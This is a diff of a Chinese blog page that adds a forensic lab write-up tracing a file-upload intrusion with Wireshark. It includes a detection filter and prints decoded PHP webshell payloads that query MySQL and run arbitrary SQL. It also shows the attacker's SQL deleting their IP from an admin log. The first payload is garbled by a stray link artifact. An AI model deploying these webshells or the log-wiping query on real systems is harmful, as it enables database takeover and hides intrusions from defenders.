@@ -143,7 +143,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    0 字
+                    404 字
                   </span>
                 
 
@@ -153,7 +153,7 @@
                       <i class="iconfont icon-clock-fill"></i>
                     
                     
-                    1
+                    6
                      分钟
                   </span>
                 
@@ -182,12 +182,49 @@
           <div class="post-content mx-auto" id="post">
             
             <article class="markdown-body">
-              
+              <h3 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h3><p>利用wireshark分析文件上传入侵,实现攻击者IP溯源和攻击证据链提供。</p>
+<h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><p>过滤出可能存在攻击的数据包：</p>
+<pre><code class="hljs cmake">http <span class="hljs-keyword">matches</span> <span class="hljs-string">"upload|alert|script|eval|select"</span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/nichoushad/pic_for_md/master/img/111.png" srcset="/img/loading.gif" alt=""></p>
+<p>发现小马</p>
+<p>对数据包base64解码后得到：</p>
+<pre><code class="hljs php">@ini_set(<span class="hljs-string">"display_errors"</span>,<span class="hljs-string">"0"</span>);
+@set_time_limit(<span class="hljs-number">0</span>);
+@set_magic_quotes_runtime(<span class="hljs-number">0</span>);
+<span class="hljs-keyword">echo</span>(<span class="hljs-string">"-&gt;|"</span>);;$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST[<span class="hljs-string">"z1"</span>]):$_POST[<span class="hljs-string">"z1"</span>];$usr=$m?stripslashes($_POST[<span class="hljs-string">"z2"</span>]):$_POST[<span class="hljs-string">"z2"</span>];$pwd=$m?stripslashes($_POST[<span class="hljs-string">"z3"</span>]):$_POST[<span class="hljs-string">"z3"</span>];$T=@mysql_connect($hst,$usr,$pwd);$q=@mysql_query(<span class="hljs-string">"SHOW DATABASES"</span>);<span class="hljs-keyword">while</span>([$rs=@mysql_fetch_row($q))&#123;<span class="hljs-keyword">echo</span>(trim($rs[<span class="hljs-number">0</span>\]).chr(<span class="hljs-number">9</span>));&#125;@mysql_close($T);;<span class="hljs-keyword">echo</span>(<span class="hljs-string">"|&lt;-"</span>);<span class="hljs-keyword">die</span>](mailto:$rs=@mysql_fetch_row($q))&#123;<span class="hljs-keyword">echo</span>(trim($rs[<span class="hljs-number">0</span>]).chr(<span class="hljs-number">9</span>));&#125;@mysql_close($T);;<span class="hljs-keyword">echo</span>(<span class="hljs-string">"|&lt;-"</span>);<span class="hljs-keyword">die</span>)();</code></pre>
+
+
+
+<p><img src="https://raw.githubusercontent.com/nichoushad/pic_for_md/master/img/20200519144918.png" srcset="/img/loading.gif" alt=""></p>
+<p>此处返回错误</p>
+<p><img src="https://raw.githubusercontent.com/nichoushad/pic_for_md/master/img/20200519144918.png" srcset="/img/loading.gif" alt=""></p>
+<p>然后上传另外一个小马：</p>
+<pre><code class="hljs perl">@ini_set(<span class="hljs-string">"display_errors"</span>,<span class="hljs-string">"0"</span>);@set_time_limit(<span class="hljs-number">0</span>);@set_magic_quotes_runtime(<span class="hljs-number">0</span>);echo(<span class="hljs-string">"-&gt;|"</span>);;$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST[<span class="hljs-string">"z1"</span>]):$_POST[<span class="hljs-string">"z1"</span>];$usr=$m?stripslashes($_POST[<span class="hljs-string">"z2"</span>]):$_POST[<span class="hljs-string">"z2"</span>];$pwd=$m?stripslashes($_POST[<span class="hljs-string">"z3"</span>]):$_POST[<span class="hljs-string">"z3"</span>];$dbn=$m?stripslashes($_POST[<span class="hljs-string">"z4"</span>]):$_POST[<span class="hljs-string">"z4"</span>];$T=@mysql_connect($hst,$usr,$pwd);$q=@mysql_query(<span class="hljs-string">"SHOW TABLES FROM `&#123;$dbn&#125;`"</span>);<span class="hljs-keyword">while</span>($rs=@mysql_fetch_row($q))&#123;echo(trim($rs[<span class="hljs-number">0</span>]).chr(<span class="hljs-number">9</span>));&#125;@mysql_close($T);;echo(<span class="hljs-string">"|&lt;-"</span>);<span class="hljs-keyword">die</span>();</code></pre>
+
+<p><img src="C:%5CUsers%5C12273%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200519145322623.png" srcset="/img/loading.gif" alt="image-20200519145322623"></p>
+<p>输入localhost root root mysql</p>
+<p>随后上传小马：</p>
+<pre><code class="hljs php">@ini_set(<span class="hljs-string">"display_errors"</span>,<span class="hljs-string">"0"</span>);@set_time_limit(<span class="hljs-number">0</span>);@set_magic_quotes_runtime(<span class="hljs-number">0</span>);<span class="hljs-keyword">echo</span>(<span class="hljs-string">"-&gt;|"</span>);;$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST[<span class="hljs-string">"z1"</span>]):$_POST[<span class="hljs-string">"z1"</span>];$usr=$m?stripslashes($_POST[<span class="hljs-string">"z2"</span>]):$_POST[<span class="hljs-string">"z2"</span>];$pwd=$m?stripslashes($_POST[<span class="hljs-string">"z3"</span>]):$_POST[<span class="hljs-string">"z3"</span>];$dbn=$m?stripslashes($_POST[<span class="hljs-string">"z4"</span>]):$_POST[<span class="hljs-string">"z4"</span>];$sql=base64_decode($_POST[<span class="hljs-string">"z5"</span>]);$T=@mysql_connect($hst,$usr,$pwd);@mysql_query(<span class="hljs-string">"SET NAMES utf8"</span>);@mysql_select_db($dbn);$q=@mysql_query($sql);<span class="hljs-keyword">echo</span>(<span class="hljs-string">"Result\t|\t\r\n"</span>);<span class="hljs-keyword">echo</span>($q?<span class="hljs-string">"Execute Successfully!"</span>:mysql_error());<span class="hljs-keyword">echo</span>(<span class="hljs-string">"\t|\t\r\n"</span>);@mysql_close($T);;<span class="hljs-keyword">echo</span>(<span class="hljs-string">"|&lt;-"</span>);<span class="hljs-keyword">die</span>();</code></pre>
+
+<p>输入localhost root root mysql </p>
+<p>传入mysql语句delete from admin_log where ip = “123.4.14.126”;</p>
+<p>删除了自己的来访痕迹。</p>
+<p><img src="C:%5CUsers%5C12273%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200519145530394.png" srcset="/img/loading.gif" alt="image-20200519145530394"></p>
+<h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p>对文件上传漏洞的流量进行了分析，由于靶机网站信息比较多，所以寻找有用的信息也比较困难，所以只好借助过滤词直接找。</p>
+
             </article>
             <hr>
             <div>
               <div class="post-metas mb-3">
                 
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/wireshark/">wireshark</a>
+                    
+                  </div>
                 
               </div>
               
